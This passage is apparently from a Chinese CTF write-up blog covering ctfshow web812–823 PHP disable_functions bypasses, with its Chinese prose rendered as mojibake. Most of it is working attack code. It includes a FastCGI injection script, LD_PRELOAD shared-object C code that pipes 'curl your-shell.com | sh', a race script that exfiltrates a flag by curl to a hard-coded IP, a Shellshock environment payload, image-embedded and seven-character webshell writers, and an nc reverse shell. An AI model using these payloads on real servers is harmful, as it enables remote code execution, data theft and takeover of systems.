&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;System.php&#39;)    parser.add_argument(&#39;-c&#39;, &#39;--code&#39;, help&#x3D;&#39;What php code your want to execute&#39;, default&#x3D;&#39;&lt;?php phpinfo(); exit; ?&gt;&#39;)    parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help&#x3D;&#39;FastCGI port&#39;, default&#x3D;9000, type&#x3D;int)    args &#x3D; parser.parse_args()    client &#x3D; FastCGIClient(args.host, args.port, 3, 0)    params &#x3D; dict()    documentRoot &#x3D; &quot;&#x2F;&quot;    uri &#x3D; args.file    content &#x3D; args.code    params &#x3D; &#123;        &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,        &#39;REQUEST_METHOD&#39;: &#39;POST&#39;,        &#39;SCRIPT_FILENAME&#39;: documentRoot + uri.lstrip(&#39;&#x2F;&#39;),        &#39;SCRIPT_NAME&#39;: uri,        &#39;QUERY_STRING&#39;: &#39;&#39;,        &#39;REQUEST_URI&#39;: uri,        &#39;DOCUMENT_ROOT&#39;: documentRoot,        &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,        &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,        &#39;REMOTE_PORT&#39;: &#39;9985&#39;,        &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,        &#39;SERVER_PORT&#39;: &#39;80&#39;,        &#39;SERVER_NAME&#39;: &quot;localhost&quot;,        &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;,        &#39;CONTENT_TYPE&#39;: &#39;application&#x2F;text&#39;,        &#39;CONTENT_LENGTH&#39;: &quot;%d&quot; % len(content),        &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,        &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;    &#125;    response &#x3D; client.request(params, content)    print(force_text(response))</code></pre><p>ç”¨æ³•ï¼š<br><code>python exp.py -c &#39;&lt;?php system(&quot;cat /f*&quot;);?&gt;&#39; -p 28074 pwn.challenge.ctf.show /usr/local/lib/php/PEAR.php</code></p><p>ç«¯å£æ”¹æˆè‡ªå·±çš„å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525195637988.png" alt="image-20220525195637988"></p><h2 id="web813"><a href="#web813" class="headerlink" title="web813"></a>web813</h2><p><strong>åŠ«æŒmysqli</strong></p><blockquote><p>å¤§è‡´è¿‡ç¨‹å°±æ˜¯è‡ªå·±ç”Ÿæˆä¸€ä¸ªmysqli.soï¼ˆmysqliçš„æ‰©å±•ï¼‰ï¼Œç„¶åæ‰©å±•é‡Œé¢æœ‰ctfshowè¿™ä¸ªå‡½æ•°ã€‚<br>é¢˜ç›®è°ƒç”¨ctfshowå‡½æ•°çš„æ—¶å€™å°±ä¼šå»æ‰©å±•é‡Œé¢æ‰¾ï¼ˆphpé‡Œé¢æ²¡æœ‰è¿™ä¸ªå‡½æ•°ï¼‰ã€‚<br>å¯ä»¥é‡‡ç”¨<a href="https://www.php.net/releases/">phpæºç </a>ä¸­çš„<code>ext_skel.php</code>æ¥ç”Ÿæˆã€‚<br>ä¸€èˆ¬åœ¨extç›®å½•ä¸‹ã€‚</p></blockquote><p>phpinfoä¸­å¯ä»¥çœ‹é»˜è®¤æ‰©å±•ç›®å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525214350144.png" alt="image-20220525214350144"></p><p>å½“phpè°ƒç”¨å‡½æ•°æ—¶ï¼Œå¦‚æœåœ¨æ³¨å†Œå‡½æ•°ä¸­æ‰¾ä¸åˆ°å°±ä¼šå»æ‰©å±•ç›®å½•ä¸­æ‰¾<br>æ­¤æ—¶æˆ‘ä»¬ä¸Šä¼ æ¶æ„soæ–‡ä»¶å¯ä»¥åŠ«æŒå‡½æ•°</p><p><strong>æ¶æ„soä¸ºä»€ä¹ˆèƒ½ç»•è¿‡disable_function</strong></p><p>php disable_functionç¦ç”¨çš„æ˜¯phpå‡½æ•°ï¼Œè€Œæ¶æ„soä¸­è°ƒç”¨çš„æ˜¯Cè¯­è¨€åº“ä¸­çš„systemå‡½æ•°</p><p><strong>ç¼–è¯‘soæ–‡ä»¶</strong></p><p><strong>ext_skelæ¡†æ¶å¼€å‘æ‰©å±•</strong></p><p>ubuntuç”¨aptæŒ‰çš„è¯é»˜è®¤ä¸å®‰è£…ï¼Œè¦è‡ªå·±æŒ‰</p><p><a href="https://blog.csdn.net/DestinyLordC/article/details/79479769">https://blog.csdn.net/DestinyLordC/article/details/79479769</a></p><p>php ext_skel.php --ext ctfshow --std</p><p>åœ¨ctfshow.cé‡Œæ”¹ä¸¤ä¸ªåœ°æ–¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525225654446.png" alt="image-20220525225654446"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525224854116.png" alt="image-20220525224854116"></p><pre class="language-txt" data-language="txt"><code class="language-txt">phpize.&#x2F;configuremake &amp;&amp; make install </code></pre><p>ç¼–è¯‘å®Œæˆåèƒ½çœ‹è§ç›®å½•ï¼Œä¹Ÿèƒ½åœ¨ç›®å½•é‡Œçœ‹è§æˆ‘ä»¬ç¼–è¯‘å¥½çš„soæ–‡ä»¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220525230440261.png" alt="image-20220525230440261"></p><p>å¤ªæ€ªäº†ï¼Œæ²¡æˆåŠŸï¼Œæœ‰ç©ºå†è¯•å§</p><p><strong>åˆ©ç”¨æ¡ä»¶</strong></p><p>1.æ‰©å±•ç›®å½•æ˜ç¡®ä¸”å¯å†™</p><p>2.èƒ½å¤Ÿè½½å…¥æ¶æ„soæ–‡ä»¶ï¼ˆé‡å¯php-fpmæˆ–è€…èƒ½ä½¿ç”¨phpå‘½ä»¤è¡Œï¼‰</p><p>3.æœ‰è°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰å‡½æ•°çš„ä»£ç  shell_exec(&quot;php -r &#39;ctfshow();&#39; &quot;)</p><h2 id="web814"><a href="#web814" class="headerlink" title="web814"></a>web814</h2><p><strong>åŠ«æŒgetuid</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;        case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        system(&quot;whoami&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125;</code></pre><p><strong>åœ¨phpä¸­ï¼Œå¯ä½¿ç”¨putenv()å‡½æ•°è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡æ¥åŠ è½½æŒ‡å®šçš„soæ–‡ä»¶ï¼Œsoæ–‡ä»¶ä¸­åŒ…å«è‡ªå®šä¹‰å‡½æ•°è¿›è¡ŒåŠ«æŒä»è€Œè¾¾åˆ°æ‰§è¡Œæ¶æ„å‘½ä»¤çš„ç›®çš„</strong></p><p>phpå¯åŠ¨<strong>æ–°è¿›ç¨‹</strong>æ—¶ï¼Œè°ƒç”¨getuidæ¥ç¡®è®¤ è¿›ç¨‹å±ä¸»(æ‰§è¡Œæƒé™ï¼‰</p><p><a href="https://www.anquanke.com/post/id/254388">æœ‰è¶£çš„ LD_PRELOAD - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></p><p><a href="https://download.qingteng.cn/frontendcdn/2019/06/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-%E7%BB%95%E8%BF%87php%E7%9A%84disable_functions%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89.pdf">å®‰å…¨ç ”ç©¶-ç»•è¿‡phpçš„disable_functionsï¼ˆä¸Šç¯‡ï¼‰.pdf (qingteng.cn)</a></p><p>æœ‰ä¸‹é¢è¿™å‡ ä¸ªå‡½æ•°çš„æ—¶å€™å°±å¯ä»¥è€ƒè™‘åˆ©ç”¨LD_PRELOADè¿›è¡Œç»•è¿‡disable_function</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526170114684.png" alt="image-20220526170114684"></p><p>ç¼–è¯‘åŒåå‡½æ•°è¿›è¡ŒåŠ«æŒ<br>æ³¨æ„è¿›è¡Œunset(LD_PERLOAD)<br>é¿å…è¿›å…¥æ­»å¾ªç¯</p><pre class="language-c" data-language="c"><code class="language-c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);&#125;uid_t getuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) &#x3D;&#x3D; NULL) &#123;        return 0;    &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload()&#123;        system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);&#125;int getuid()&#123;        if(getenv(&quot;LD_PRELOAD&quot;)&#x3D;&#x3D;NULL)&#123; return 0;&#125;        unsetenv(&quot;LD_PRELOAD&quot;);        payload();&#125;</code></pre><p>gcc -shared -fPIC getuid.c -o getuid.so </p><p>ç„¶åä¸Šè„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;5fce36f5-6270-4ea7-ac06-2ab0c6e1cd5a.challenge.ctf.show&#x2F;&quot;data&#x3D;&#123;&#39;file&#39;:&#39;&#x2F;tmp&#x2F;getuid.so&#39;,&#39;content&#39;:open(&#39;getuid.so&#39;,&#39;rb&#39;).read()&#125;requests.post(url+&#39;?a&#x3D;write&#39;,data&#x3D;data)requests.get(url+&#39;?a&#x3D;run&amp;env&#x3D;LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;getuid.so&#39;)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526165856011.png" alt="image-20220526165856011"></p><h2 id="web815"><a href="#web815" class="headerlink" title="web815"></a>web815</h2><p><strong>åŠ«æŒæ„é€ å™¨</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$action &#x3D; $_GET[&#39;a&#39;];switch ($action) &#123;    case &#39;phpinfo&#39;:        phpinfo();        break;        case &#39;write&#39;:        file_put_contents($_POST[&#39;file&#39;],$_POST[&#39;content&#39;]);        break;    case &#39;run&#39;:        putenv($_GET[&#39;env&#39;]);        mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);        break;    default:        highlight_file(__FILE__);        break;&#125;</code></pre><p>ä¹Ÿå¯ä»¥ç”¨814çš„æ–¹æ³•</p><p>ä½†æ˜¯è¿™é¢˜æ˜¯è¦ç”¨è¿™ç§</p><pre class="language-c" data-language="c"><code class="language-c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void hack(void)&#123;unsetenv(&quot;LD_PRELOAD&quot;);system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;ip:port |sh&quot;);&#125;</code></pre><p>äº§ç”Ÿæ–°è¿›ç¨‹å³ä½¿ç”¨<br>é€šç”¨åŠ«æŒæ–¹æ³• ä¸ç”¨æ¯”å¯¹ä¸åŒçš„å‡½æ•°<br>åŠ«æŒæ„é€ å™¨<br>æ„é€ å™¨èƒ½è‡ªå®šå‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526172217311.png" alt="image-20220526172217311"></p><h2 id="web816"><a href="#web816" class="headerlink" title="web816"></a>web816</h2><p><strong>ä¸´æ—¶æ–‡ä»¶åˆ©ç”¨</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env.scandir(&quot;&#x2F;tmp&quot;)[2]);    system(&quot;echo ctfshow&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>æ²¡ä¸Šä¼ ç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“phpä¸Šä¼ çš„æ–‡ä»¶åä¼šåœ¨tmpç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œè€Œè¿™é‡Œ</p><p>çš„scandir(&quot;/tmp&quot;)[2]å°±æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ‰€ä»¥è®©env=LD_PRELOAD=/tmp/å°±å¯ä»¥å’Œ815ä¸€æ ·äº†</p><p>æ”¹æ”¹è„šæœ¬å°±å¯ä»¥æ¥ç€ç”¨äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526174525785.png" alt="image-20220526174525785"></p><h2 id="web817"><a href="#web817" class="headerlink" title="web817"></a>web817</h2><pre class="language-php" data-language="php"><code class="language-php">$file &#x3D; $_GET[&#39;file&#39;];if(isset($file) &amp;&amp; preg_match(&quot;&#x2F;^\&#x2F;(\w+\&#x2F;?)+$&#x2F;&quot;, $file))&#123;shell_exec(shell_exec(&quot;cat $file&quot;));&#125;else&#123;system(&quot;ps aux&quot;);&#125;</code></pre><p>é¢˜ç›®æºç ï¼Œéƒ½æ²¡ä¸ªæ­£å¸¸çš„webé¡µé¢</p><p>é¢˜ç›®é‡Œé¢çš„æ­£åˆ™è¡¨è¾¾å¼å¤§æ¦‚æ„æ€å°±æ˜¯ä»¥<code>/</code>å¼€å¤´ï¼Œå¹¶ä¸”åé¢åªèƒ½æœ‰æ•°å­—å­—æ¯å’Œ<code>/</code></p><p>æˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡å™¨ä¸Šæ„é€ ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”æ–‡ä»¶å†…å®¹æ˜¯å¯æ§çš„ï¼Œæˆ–è€…æ˜¯æœåŠ¡å™¨æœ¬èº«å°±æœ‰è¿™æ ·çš„æ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚<br>å¤§æ¦‚åªèƒ½æ˜¯æ„é€ ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œæˆ–è€…å¯ä»¥æ—¥å¿—å¯æ§ã€‚</p><p>æ—¥å¿—çš„è¯è¦æœ‰.logçš„åç¼€ï¼Œæ‰€ä»¥åªèƒ½æƒ³ä¸´æ—¶æ–‡ä»¶äº†</p><p><strong>åˆ©ç”¨nginxçš„bodyç¼“å­˜æœºåˆ¶</strong></p><p>nginxä»è¯·æ±‚çš„bodyä½“ä¸­æ¯æ¬¡é»˜è®¤è¯»å–ä¸€å®šé‡çš„å­—èŠ‚ï¼Œå¦‚æœbodyå­—æ®µå¤§äºè¿™ä¸ªå­—èŠ‚ï¼ˆ32ä½æœºå™¨æ˜¯8kï¼Œ64ä½æœºå™¨æ˜¯16kï¼‰ï¼Œé‚£ä¹ˆåœ¨ä¸‹æ¬¡è¯»å–æ—¶ä¹‹å‰ä¸€éƒ¨åˆ†çš„å­—èŠ‚å°±ä¼š<strong>è¢«å­˜å…¥ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­</strong></p><p>å¦‚æœæˆ‘ä»¬åœ¨å‘å®Œå‰sleepå‡ ç§’é’Ÿï¼Œé‚£ä¹ˆå°±èƒ½å¾ˆæ¸…æ¥šçš„æ‰¾åˆ°å¹¶ä¸”èƒ½å¤Ÿè®¿é—®è¿™äº›ä¸´æ—¶æ–‡ä»¶</p><p>é»˜è®¤æ–‡ä»¶çš„è·¯å¾„å¤§è‡´ä¸º</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000001&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000002&#x2F;var&#x2F;lib&#x2F;nginx&#x2F;tmp&#x2F;client_body&#x2F;0000000003</code></pre><p>ä½†æ˜¯bodyç¼“å­˜åœ¨nginxè¯»å–å®Œï¼Œè½¬å‘ç»™php-fpmåå°±åˆ é™¤äº†ï¼Œå°±æ˜¯è¯´åœ¨phpè§£é‡Šæ‰§è¡Œä¹‹å‰å°±è¢«åˆ é™¤äº†</p><p>è¿™æ—¶å€™å°±è¦å€ŸåŠ©Linuxç‰¹æ€§äº†</p><p>Linuxæœ‰ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ä¼šå°†æ‰“å¼€ååˆ é™¤äº†ä½†æ˜¯è¿˜æ²¡æœ‰å…³é—­çš„æ–‡ä»¶å­˜å…¥/proc/PID/fd/{1}ä¸­ï¼ˆéœ€è¦åŒä¸€ç”¨æˆ·çš„æ“ä½œã€‚</p><p>è€Œpidæˆ‘ä»¬é€šè¿‡ä¼ ä¸€ä¸ªä¸å¸¦å‚æ•°çš„getè¯·æ±‚å°±å¯ä»¥å¾—åˆ°ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526181858962.png" alt="image-20220526181858962"></p><p>æ‰€ä»¥æˆ‘ä»¬åªè¦<strong>ä¸€è¾¹postä¼ æ•°æ®ï¼Œä¸€è¾¹éå†fdä¸‹çš„æ–‡ä»¶</strong></p><p>åŸç†ææ‡‚äº†ï¼Œç›´æ¥ä¸Šç¾½å¸ˆå‚…çš„è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import  threading, requestsimport socketimport report&#x3D; 28053s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F; HTTP&#x2F;1.1Host:127.0.0.1&#39;&#39;&#39;.encode())data&#x3D;s.recv(1024).decode()s.close()pid &#x3D; re.findall(&#39;(.*?) www-data&#39;,data)[0].strip()print(pid)con&#x3D;&quot;curl http:&#x2F;&#x2F;101.34.94.44:4567?&#96;cat &#x2F;f*&#96;;&quot;+&#39;0&#39;*1024*500l &#x3D; len(con)def upload():while True:s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))x&#x3D;f&#39;&#39;&#39;POST &#x2F; HTTP&#x2F;1.1Host: 127.0.0.1Content-Length: &#123;l&#125;Content-Type: application&#x2F;x-www-form-urlencodedConnection: close&#123;con&#125;&#39;&#39;&#39;.encode()s.send(x)s.close()def bruter():while True:for fd in range(3,40):print(fd)s&#x3D;socket.socket()s.connect((&#39;pwn.challenge.ctf.show&#39;,port))s.send(f&#39;&#39;&#39;GET &#x2F;?file&#x3D;&#x2F;proc&#x2F;&#123;pid&#125;&#x2F;fd&#x2F;&#123;fd&#125; HTTP&#x2F;1.1Host: 127.0.0.1Connection: close&#39;&#39;&#39;.encode())print(s.recv(2048).decode())s.close()for i in range(30):    t &#x3D; threading.Thread(target&#x3D;upload)    t.start()for j in range(30):    a &#x3D; threading.Thread(target&#x3D;bruter)    a.start()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526182711985.png" alt="image-20220526182711985">ï¼ˆå¥½å¡å•Š</p><h2 id="web818"><a href="#web818" class="headerlink" title="web818"></a>web818</h2><pre class="language-php" data-language="php"><code class="language-php">$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;putenv($env);system(&quot;echo ctfshow&quot;);&#125;else&#123;system(&quot;ps aux&quot;);&#125;Â·Â·Â·</code></pre><p>å’Œ817ä¸€æ ·çš„åŸç†ï¼Œåªä¸è¿‡æŠŠè¦ä¼ å…¥çš„ä¸œè¥¿å˜æˆäº†æ¶æ„soæ–‡ä»¶</p><p>æ¶æ„æ–‡ä»¶ç”¨816é‚£ä¸ªå°±å¯ä»¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230108433.png" alt="image-20220526230108433"></p><p>ï¼ˆå¡å¡å¡å¡å¡</p><h2 id="web819"><a href="#web819" class="headerlink" title="web819"></a>web819</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$env &#x3D; $_GET[&#39;env&#39;];if(isset($env))&#123;    putenv($env);    system(&quot;whoami&quot;);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>æ²¡æœ‰ <em>ps</em> <em>aux</em> æ¥æ˜¾ç¤ºæ‰€æœ‰è¿›ç¨‹ï¼Œè¦é çˆ†ç ´pidæ˜¾ç„¶ä¸å¤ªæ˜¾ç¤º</p><p>è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨å¦ä¸€ç§æ¼æ´ã€‚</p><p><strong>ç ´å£³æ¼æ´</strong></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230337557.png" alt="image-20220526230337557"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526230658812.png" alt="image-20220526230658812"></p><p>æ„Ÿè§‰è¿™å°±ç±»ä¼¼phpçš„create_functionå‡½æ•°çš„å‘½ä»¤é€ƒé€¸ä¸€æ ·ï¼Œåˆ©ç”¨ç»“æŸç¬¦è®©è¿™ä¸ªå‡½æ•°æå‰ç»“æŸç„¶ååœ¨åé¢åŠ ä¸Šæˆ‘ä»¬è‡ªå·±çš„å‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231102728.png" alt="image-20220526231102728"></p><p>è¿™é‡Œå› ä¸ºåè¾¹æ‰§è¡Œäº†whoamiå‘½ä»¤ï¼Œæˆ‘ä»¬å°±ç›´æ¥åˆ©ç”¨putenvä¿®æ”¹whoamiå‘½ä»¤å°±è¡Œã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231157070.png" alt="image-20220526231157070"></p><p>æœ€ç»ˆpayload</p><pre class="language-txt" data-language="txt"><code class="language-txt">env&#x3D;BASH_FUNC_whoami%%&#x3D;() &#123; cat &#x2F;f*; &#125;</code></pre><h2 id="web820"><a href="#web820" class="headerlink" title="web820"></a>web820</h2><p>éå¸¸è§„çš„æ–‡ä»¶ä¸Šä¼ </p><p>upload.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);if(strlen($_FILES[&#39;file&#39;][&#39;tmp_name&#39;])&gt;0)&#123;    $filetype &#x3D; $_FILES[&#39;file&#39;][&#39;type&#39;];    $tmpname &#x3D; $_FILES[&#39;file&#39;][&#39;tmp_name&#39;];    $ef &#x3D; getimagesize($tmpname);    if( ($filetype&#x3D;&#x3D;&quot;image&#x2F;jpeg&quot;) &amp;&amp; ($ef!&#x3D;false) &amp;&amp; ($ef[&#39;mime&#39;]&#x3D;&#x3D;&#39;image&#x2F;jpeg&#39;))&#123;        $content &#x3D; base64_decode(file_get_contents($tmpname));        file_put_contents(&quot;shell.php&quot;, $content);        echo &quot;file upload success!&quot;;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹è¢«base64è§£ç ä¸€æ¬¡åå†æ”¾è¿›shell.phpï¼Œè€Œbase64é‡åˆ°ä¸å±äºè‡ªå·±ç¼–ç å­—ç¬¦å†…çš„å­—ç¬¦æ—¶ä¼šè·³è¿‡ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„å›¾ç‰‡</p><p>ç¾¤ä¸»æ„é€ çš„å›¾ç‰‡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526231808397.png" alt="image-20220526231808397"></p><p>é‡Œé¢çš„å­—ç¬¦è¢«base64è§£ç åä¸º</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;&#96;$_GET[1]&#96;;;?&gt;?</code></pre><p>ä¹Ÿå°±æ˜¯ä¸€ä¸ªgetå‹çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå‚æ•°æ˜¯1</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220526232148797.png" alt="image-20220526232148797"></p><h2 id="web821"><a href="#web821" class="headerlink" title="web821"></a>web821</h2><p>ä¸ƒå­—ç¬¦å¯å†™</p><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php">error_reporting(0);highlight_file(__FILE__);$cmd &#x3D; $_POST[&#39;cmd&#39;];if(strlen($cmd) &lt;&#x3D; 7)&#123;    shell_exec($cmd);&#125;</code></pre><p>ç›´æ¥ä¸Šç¾¤ä¸»å¸ˆå‚…çš„è„šæœ¬å°±è¡Œäº†</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;ed9441a5-6e27-43b0-8538-bdd2f5a5b4d2.challenge.ctf.show&#x2F;&quot;payload&#x3D;[&quot;&gt;hp&quot;,&quot;&gt;1.p\\&quot;,&quot;&gt;d\\&gt;\\&quot;,&quot;&gt;\\ -\\&quot;,&quot;&gt;e64\\&quot;,&quot;&gt;bas\\&quot;,&quot;&gt;7\\|\\&quot;,&quot;&gt;XSk\\&quot;,&quot;&gt;Fsx\\&quot;,&quot;&gt;dFV\\&quot;,&quot;&gt;kX0\\&quot;,&quot;&gt;bCg\\&quot;,&quot;&gt;XZh\\&quot;,&quot;&gt;AgZ\\&quot;,&quot;&gt;waH\\&quot;,&quot;&gt;PD9\\&quot;,&quot;&gt;o\\ \\&quot;,&quot;&gt;ech\\&quot;,&quot;ls -t&gt;0&quot;,&quot;. 0&quot;]def writeFile(payload):data&#x3D;&#123;&quot;cmd&quot;:payload&#125;requests.post(url,data&#x3D;data)def run():for p in payload:writeFile(p.strip())print(&quot;[*] create &quot;+p.strip())time.sleep(1)def check():response &#x3D; requests.get(url+&quot;1.php&quot;)if response.status_code &#x3D;&#x3D; requests.codes.ok:print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;1.php&quot;)def main():run()check()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()</code></pre><p>è¿™ä¸ªä¸»è¦å°±æ˜¯å°†ä¸€ä¸ªgetå‹çš„ä¸€å¥è¯æœ¨é©¬ï¼Œå‚æ•°æ˜¯1ï¼Œå†™è¿›äº†1.php</p><p>åŸç†å°±æ˜¯Linuxä¸­&gt;xå¯ä»¥ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶åä¸ºxçš„æ–‡ä»¶</p><p>è€Œ. xåˆèƒ½æ‰§è¡Œshellå‘½ä»¤</p><p>æ‰€ä»¥åˆ©ç”¨ls -tå¯¹æ–‡ä»¶æŒ‰ç…§æ—¶é—´è¿›è¡Œæ’åºä¹‹åå­˜å…¥0æ–‡ä»¶ï¼Œå†åˆ©ç”¨. 0æ¥æ‰§è¡Œè¿™äº›æ–‡ä»¶åæ„æˆçš„å‘½ä»¤</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132006261.png" alt="image-20220527132006261"></p><p>é¢˜ç›®æç¤ºflagåœ¨æ•°æ®åº“é‡Œï¼Œç”¨èšå‰‘è¿æ¥</p><p>getè½¬post</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132311936.png" alt="image-20220527132311936"></p><p>æ•°æ®æ“ä½œï¼Œç„¶åå¼±å£ä»¤ç™»å½•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132607438.png" alt="image-20220527132607438"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220527132632203.png" alt="image-20220527132632203"></p><h2 id="web822"><a href="#web822" class="headerlink" title="web822"></a>web822</h2><p>ä¸ƒå­—ç¬¦ä¸å¯å†™</p><p>å’Œ821ä¸€æ ·çš„ä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰äº†å†™å…¥æƒé™ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±è¦æƒ³åˆ©ç”¨ä¸´æ—¶æ–‡ä»¶äº†ï¼Œæ¯”å¦‚/t*/*</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;a7276db0-6191-44d2-bbf9-c992009366b4.challenge.ctf.show&#x2F;&quot;def getShell(payload):data&#x3D;&#123;&quot;cmd&quot;:payload&#125;file &#x3D; &#123;&quot;file&quot;:b&quot;#!&#x2F;bin&#x2F;sh\nnc ip 5001 -e &#x2F;bin&#x2F;sh&quot;&#125;requests.post(url,data&#x3D;data,files&#x3D;file)print(&quot;[*] Attack success!!!&quot;)def run():getShell(&quot;. &#x2F;t*&#x2F;*&quot;)def main():run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()</code></pre><p>åå¼¹shell</p><h2 id="web823"><a href="#web823" class="headerlink" title="web823"></a>web823</h2><p>5å­—ç¬¦å¯å†™ï¼Œæœ‰dir</p><p>å¾ˆå‰å®³çš„æ€è·¯ï¼ŒæŠŠindex.phpæ”¹å†™æˆ.index</p><p>è¿˜æ˜¯æœ‰ç¾¤ä¸»çš„è„šæœ¬</p><pre class="line-numbers language-python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
